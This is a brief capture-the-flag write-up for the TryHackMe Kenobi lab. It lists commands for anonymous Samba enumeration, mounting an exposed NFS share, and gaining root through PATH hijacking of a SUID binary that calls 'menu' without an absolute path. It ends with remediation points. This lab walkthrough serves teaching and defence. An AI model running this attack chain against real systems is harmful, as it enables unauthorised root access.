# Kenobi - TryHackMe

**Skills:** Samba, NFS, SUID, Path Manipulation

## Recon
nmap -sV -sC -p- IP
-> 22 ssh, 139/445 samba, 111 nfs, 2049 nfs

## Samba
smbclient -L //IP/ -N
smbclient //IP/anonymous -N
-> log.txt -> id_rsa for kenobi

## NFS
showmount -e IP
-> /var
mkdir /tmp/mnt; mount IP:/var /tmp/mnt
-> found /tmp/mnt/tmp/... SUID binary + strings

## PrivEsc
- strings /var/tmp/... -> /usr/bin/menu
- SUID binary calls menu without absolute path
- echo '/bin/sh' > /tmp/mnt/.../menu; chmod +x
- ./SUID-binary -> root

## Fix
- Secure samba anonymous
- No world-writable NFS /var
- Use absolute path in SUID binary
